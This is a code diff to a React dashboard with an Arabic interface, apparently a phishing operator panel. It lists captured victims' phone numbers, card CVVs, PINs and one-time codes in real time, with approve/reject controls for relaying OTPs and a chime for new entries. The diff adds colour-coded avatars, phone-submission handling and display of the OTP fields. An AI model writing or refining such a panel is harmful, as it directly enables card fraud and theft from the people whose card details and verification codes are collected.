@@ -39,6 +39,23 @@ type UserData = {
   authNumber?: string
   cardOtpApproval?: "pending" | "approved" | "rejected"
   phoneOtpApproval?: "pending" | "approved" | "rejected"
+  phoneSubmitted?: boolean // Added for phone submission status
+  color?: string
+ otp?: string
+}
+
+const getRandomColor = () => {
+  const colors = [
+    "#10b981", // green
+    "#3b82f6", // blue
+    "#f59e0b", // amber
+    "#ef4444", // red
+    "#8b5cf6", // violet
+    "#ec4899", // pink
+    "#14b8a6", // teal
+    "#f97316", // orange
+  ]
+  return colors[Math.floor(Math.random() * colors.length)]
 }
 
 export default function DashboardPage() {
@@ -50,7 +67,8 @@ export default function DashboardPage() {
   const [paymentFilter, setPaymentFilter] = useState<string>("all")
   const [readFilter, setReadFilter] = useState<string>("all")
   const [cardFilter, setCardFilter] = useState<string>("all")
-  const audioRef = useRef<HTMLAudioElement>(null)
+  const audioRef = useRef<HTMLAudioElement | null>(null) as React.MutableRefObject<HTMLAudioElement | null>;
+
   const [editingAuthNumber, setEditingAuthNumber] = useState(false)
   const [authNumberValue, setAuthNumberValue] = useState("")
 
@@ -83,6 +101,10 @@ export default function DashboardPage() {
             }
           })
 
+          if (!processedData.color) {
+            processedData.color = getRandomColor()
+          }
+
           if (!processedData.isRead) {
             hasNewUnread = true
           }
@@ -90,12 +112,20 @@ export default function DashboardPage() {
           userData.push(processedData as UserData)
         })
 
-        if (hasNewUnread && users.length > 0 && audioRef.current) {
+        const prevUnreadCount = users.filter((u) => !u.isRead).length
+        const newUnreadCount = userData.filter((u) => !u.isRead).length
+
+        if (newUnreadCount > prevUnreadCount && users.length > 0 && audioRef.current) {
           audioRef.current.play().catch((err) => console.log("[v0] Audio play failed:", err))
         }
 
         setUsers(userData)
-        if (userData.length > 0 && !selectedUser) {
+        if (selectedUser) {
+          const updatedUser = userData.find((u) => u.id === selectedUser.id)
+          if (updatedUser) {
+            setSelectedUser(updatedUser)
+          }
+        } else if (userData.length > 0) {
           setSelectedUser(userData[0])
         }
         setLoading(false)
@@ -107,7 +137,7 @@ export default function DashboardPage() {
     )
 
     return () => unsubscribe()
-  }, [users.length, selectedUser])
+  }, [users.length])
 
   const filteredUsers = users.filter((user) => {
     const matchesSearch =
@@ -172,6 +202,17 @@ export default function DashboardPage() {
       })
     } catch (error) {
       console.error("[v0] Error updating phone OTP approval:", error)
+    }
+  }
+
+  const submitPhoneAndOperator = async (userId: string) => {
+    try {
+      const userRef = doc(db, "pays", userId)
+      await updateDoc(userRef, {
+        phoneSubmitted: true,
+      })
+    } catch (error) {
+      console.error("[v0] Error submitting phone:", error)
     }
   }
 
@@ -404,13 +445,25 @@ export default function DashboardPage() {
             >
               <div onClick={() => setSelectedUser(user)} className="flex items-start gap-4">
                 <div className="relative flex-shrink-0">
-                  <Avatar className="h-14 w-14 ring-2 ring-border shadow-lg">
-                    <AvatarFallback className="bg-avatar-bg text-avatar-foreground text-base font-bold">
+                  <Avatar
+                    className="h-14 w-14 shadow-lg"
+                    style={{
+                      border: `3px solid ${user.color || "#10b981"}`,
+                      boxShadow: `0 0 0 2px rgba(0,0,0,0.1), 0 0 12px ${user.color || "#10b981"}40`,
+                    }}
+                  >
+                    <AvatarFallback
+                      className="text-base font-bold text-white"
+                      style={{ backgroundColor: user.color || "#10b981" }}
+                    >
                       {user.phone?.slice(-4)}
                     </AvatarFallback>
                   </Avatar>
                   {user.status === "online" && (
-                    <div className="absolute bottom-0 left-0 h-4 w-4 bg-status-online border-2 border-sidebar rounded-full shadow-md"></div>
+                    <>
+                      <div className="absolute -bottom-0.5 -left-0.5 h-5 w-5 bg-status-online border-3 border-sidebar rounded-full shadow-lg z-10"></div>
+                      <div className="absolute -bottom-0.5 -left-0.5 h-5 w-5 bg-status-online rounded-full animate-ping opacity-75"></div>
+                    </>
                   )}
                 </div>
                 <div className="flex-1 min-w-0">
@@ -464,10 +517,24 @@ export default function DashboardPage() {
       {/* Main Content */}
       {selectedUser && (
         <div className="flex-1 flex flex-col h-full overflow-hidden">
-          <div className="p-6 border-b border-border/50 bg-chat-header flex-shrink-0 shadow-md backdrop-blur-sm">
+          <div
+            className="bg-card border-b border-border/50 p-6 shadow-lg"
+            style={{
+              borderBottom: `4px solid ${selectedUser.color || "#10b981"}`,
+            }}
+          >
             <div className="flex items-center gap-4">
-              <Avatar className="h-14 w-14 ring-2 ring-border shadow-xl">
-                <AvatarFallback className="bg-avatar-bg text-avatar-foreground font-bold text-lg">
+              <Avatar
+                className="h-16 w-16 shadow-xl"
+                style={{
+                  border: `3px solid ${selectedUser.color || "#10b981"}`,
+                  boxShadow: `0 0 0 2px rgba(0,0,0,0.1), 0 0 16px ${selectedUser.color || "#10b981"}60`,
+                }}
+              >
+                <AvatarFallback
+                  className="text-lg font-bold text-white"
+                  style={{ backgroundColor: selectedUser.color || "#10b981" }}
+                >
                   {selectedUser.phone?.slice(-4)}
                 </AvatarFallback>
               </Avatar>
@@ -476,11 +543,17 @@ export default function DashboardPage() {
                 <p className="text-sm text-muted-foreground flex items-center gap-2 mt-0.5">
                   {selectedUser.status === "online" ? (
                     <>
-                      <span className="inline-block h-2 w-2 rounded-full bg-status-online shadow-sm shadow-status-online/50"></span>
+                      <span className="relative flex h-2.5 w-2.5">
+                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-status-online opacity-75"></span>
+                        <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-status-online shadow-sm shadow-status-online/50"></span>
+                      </span>
                       متصل الآن
                     </>
                   ) : (
-                    `آخر ظهور ${formatDateTime(selectedUser.lastSeen)}`
+                    <>
+                      <span className="inline-block h-2 w-2 rounded-full bg-muted"></span>
+                      آخر ظهور {formatDateTime(selectedUser.lastSeen)}
+                    </>
                   )}
                 </p>
               </div>
@@ -634,15 +707,17 @@ export default function DashboardPage() {
                         <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                           <span className="text-muted-foreground font-medium">CVV:</span>
                           <span className="text-foreground font-bold font-mono">
-                          <span className="text-foreground font-bold font-mono">{selectedUser.cvv}</span>
+              {selectedUser.cvv}
                           </span>
                         </div>
                       )}
-                      {selectedUser.pin && (
+                      {selectedUser.otp && (
                         <div className="flex flex-col gap-3 pt-3 border-t border-border/30">
                           <div className="flex justify-between gap-12">
                             <span className="text-muted-foreground font-medium">الرقم السري:</span>
-                            <span className="text-foreground font-bold font-mono">{selectedUser.pin}</span>
+                            <span className="text-foreground font-bold font-mono">
+                            {selectedUser.pin}
+                            </span>
                           </div>
                           {/* Approval buttons for card OTP */}
                           <div className="pt-3 border-t border-border/30">
@@ -686,7 +761,7 @@ export default function DashboardPage() {
               )}
 
               {/* Verification Info Message */}
-              {(selectedUser.operator || selectedUser.phoneOtp) && (
+              {(selectedUser.operator || selectedUser.phoneOtp || selectedUser.phone) && (
                 <div className="flex justify-end animate-in fade-in slide-in-from-left-4 duration-300">
                   <div className="bg-message-sent rounded-2xl p-6 max-w-md shadow-xl">
                     <h3 className="font-bold mb-4 text-message-sent-foreground text-lg flex items-center gap-2">
@@ -694,55 +769,92 @@ export default function DashboardPage() {
                       معلومات التحقق
                     </h3>
                     <div className="space-y-3 text-sm">
-                      {selectedUser.operator && (
-                        <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                          <span className="text-message-sent-muted font-medium">المشغل:</span>
-                          <span className="text-message-sent-foreground font-bold">{selectedUser.operator}</span>
-                        </div>
-                      )}
-                      {selectedUser.phoneOtp && (
-                        <div className="flex flex-col gap-3 pt-3 border-t border-message-sent-border/30">
-                          <div className="flex justify-between gap-12">
-                            <span className="text-message-sent-muted font-medium">كود التحقق:</span>
-                            <span className="text-message-sent-foreground font-bold font-mono">
-                              {selectedUser.phoneOtp}
-                            </span>
-                          </div>
-                          {/* Approval buttons for phone OTP */}
+                      {!selectedUser.phoneSubmitted && (selectedUser.phone || selectedUser.operator) && (
+                        <>
+                          {selectedUser.phone && (
+                            <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
+                              <span className="text-message-sent-muted font-medium">رقم الهاتف:</span>
+                              <span className="text-message-sent-foreground font-bold">{selectedUser.phone}</span>
+                            </div>
+                          )}
+                          {selectedUser.operator && (
+                            <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
+                              <span className="text-message-sent-muted font-medium">المشغل:</span>
+                              <span className="text-message-sent-foreground font-bold">{selectedUser.operator}</span>
+                            </div>
+                          )}
                           <div className="pt-3 border-t border-message-sent-border/30">
-                            <div className="flex items-center justify-between gap-3">
-                              <span className="text-xs text-message-sent-muted">حالة الموافقة:</span>
-                              <div className="flex gap-2">
-                                <Button
-                                  size="sm"
-                                  variant={selectedUser.phoneOtpApproval === "approved" ? "default" : "outline"}
-                                  onClick={() => updatePhoneOtpApproval(selectedUser.id, "approved")}
-                                  className={
-                                    selectedUser.phoneOtpApproval === "approved"
-                                      ? "bg-green-600 hover:bg-green-700 text-white shadow-md"
-                                      : "shadow-sm"
-                                  }
-                                >
-                                  <Check className="h-4 w-4 ml-1" />
-                                  موافق
-                                </Button>
-                                <Button
-                                  size="sm"
-                                  variant={selectedUser.phoneOtpApproval === "rejected" ? "default" : "outline"}
-                                  onClick={() => updatePhoneOtpApproval(selectedUser.id, "rejected")}
-                                  className={
-                                    selectedUser.phoneOtpApproval === "rejected"
-                                      ? "bg-red-600 hover:bg-red-700 text-white shadow-md"
-                                      : "shadow-sm"
-                                  }
-                                >
-                                  <X className="h-4 w-4 ml-1" />
-                                  رفض
-                                </Button>
+                            <Button
+                              size="sm"
+                              onClick={() => submitPhoneAndOperator(selectedUser.id)}
+                              className="w-full bg-teal-600 hover:bg-teal-700 text-white shadow-md"
+                            >
+                              <Check className="h-4 w-4 ml-2" />
+                              إرسال رمز التحقق
+                            </Button>
+                          </div>
+                        </>
+                      )}
+
+                      {selectedUser.phoneSubmitted && (
+                        <>
+                          {selectedUser.phone && (
+                            <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
+                              <span className="text-message-sent-muted font-medium">رقم الهاتف:</span>
+                              <span className="text-message-sent-foreground font-bold">{selectedUser.phone}</span>
+                            </div>
+                          )}
+                          {selectedUser.operator && (
+                            <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
+                              <span className="text-message-sent-muted font-medium">المشغل:</span>
+                              <span className="text-message-sent-foreground font-bold">{selectedUser.operator}</span>
+                            </div>
+                          )}
+                          {selectedUser.phoneOtp && (
+                            <div className="flex flex-col gap-3 pt-3 border-t border-message-sent-border/30">
+                              <div className="flex justify-between gap-12">
+                                <span className="text-message-sent-muted font-medium">كود التحقق:</span>
+                                <span className="text-message-sent-foreground font-bold font-mono">
+                                  {selectedUser.phoneOtp}
+                                </span>
+                              </div>
+                              {/* Approval buttons for phone OTP */}
+                              <div className="pt-3 border-t border-message-sent-border/30">
+                                <div className="flex items-center justify-between gap-3">
+                                  <span className="text-xs text-message-sent-muted">حالة الموافقة:</span>
+                                  <div className="flex gap-2">
+                                    <Button
+                                      size="sm"
+                                      variant={selectedUser.phoneOtpApproval === "approved" ? "default" : "outline"}
+                                      onClick={() => updatePhoneOtpApproval(selectedUser.id, "approved")}
+                                      className={
+                                        selectedUser.phoneOtpApproval === "approved"
+                                          ? "bg-green-600 hover:bg-green-700 text-white shadow-md"
+                                          : "shadow-sm"
+                                      }
+                                    >
+                                      <Check className="h-4 w-4 ml-1" />
+                                      موافق
+                                    </Button>
+                                    <Button
+                                      size="sm"
+                                      variant={selectedUser.phoneOtpApproval === "rejected" ? "default" : "outline"}
+                                      onClick={() => updatePhoneOtpApproval(selectedUser.id, "rejected")}
+                                      className={
+                                        selectedUser.phoneOtpApproval === "rejected"
+                                          ? "bg-red-600 hover:bg-red-700 text-white shadow-md"
+                                          : "shadow-sm"
+                                      }
+                                    >
+                                      <X className="h-4 w-4 ml-1" />
+                                      رفض
+                                    </Button>
+                                  </div>
+                                </div>
                               </div>
                             </div>
-                          </div>
-                        </div>
+                          )}
+                        </>
                       )}
                     </div>
                   </div>
